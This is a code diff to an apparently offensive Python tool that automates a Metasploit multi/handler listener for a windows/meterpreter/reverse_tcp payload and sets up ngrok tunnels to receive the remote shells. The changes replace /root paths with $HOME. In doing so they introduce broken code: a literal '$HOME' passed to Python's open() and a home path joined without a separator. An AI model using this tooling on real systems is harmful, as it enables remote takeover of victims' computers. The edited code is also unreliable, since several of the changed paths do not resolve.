@@ -8,6 +8,7 @@ Created on Wed Mar  4 10:14:55 2020
 import os, sys
 import netifaces as ni
 import time
+from os.path import expanduser
 
 
 #Global varables
@@ -103,8 +104,8 @@ def msfconsole():
     logo()
     print(GREEN + " Starting msfconsole..")
     try:
-        os.system("sudo xterm -T Metasploit -e msfconsole -q -r /root/.androwind/systemHandler.r")
-        os.system("sudo rm systemHandler.r && sudo rm -rf /root/.ngrok2/ && sudo rm -rf /tmp/payload/")
+        os.system("sudo xterm -T Metasploit -e msfconsole -q -r $HOME/.androwind/systemHandler.r")
+        os.system("sudo rm systemHandler.r && sudo rm -rf $HOME/.ngrok2/ && sudo rm -rf /tmp/payload/")
         print("Done. Good Bye!")
     except Exception as ex:
         print("Exception: %s " %str(ex))
@@ -112,7 +113,7 @@ def msfconsole():
 #it create systemHandler.r file for metasploit
 def metaConfig(ip, port):
     try:
-        f = open("/root/.androwind/systemHandler.r", "w+")
+        f = open("$HOME/.androwind/systemHandler.r", "w+")
         f.write("use exploit/multi/handler\n")
         f.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
         f.write(f"set LHOST {ip}\n")
@@ -125,7 +126,7 @@ def metaConfig(ip, port):
 # CTRl + S to save file and CTRL + X to go further
 def systemHandler():
     try:
-        os.system("sudo xterm -T Metasploit -e nano /root/.androwind/systemHandler.r")
+        os.system("sudo xterm -T Metasploit -e nano $HOME/.androwind/systemHandler.r")
 
     except Exception as ex:
         print("Exception: %s " %str(ex))
@@ -139,11 +140,12 @@ def ngrok():
 
 #it configure ngrok for portforwaring for multiple sessions HTTP and TCP
 def ngConfig():
-    path = "/root/.ngrok2"
+    home = expanduser("~")
+    path = "{}.ngrok2".format(home)
     if not os.path.exists(path):
 
         try:
-            os.system(f"sudo mkdir /root/.ngrok2 && sudo cp -f /root/.androwind/ngrok.yml /root/.ngrok2/")
+            os.system(f"sudo mkdir $HOME/.ngrok2 && sudo cp -f $HOME/.androwind/ngrok.yml $HOME/.ngrok2/")
 
         except Exception as ex:
             print("Exception: %s " %str(ex))
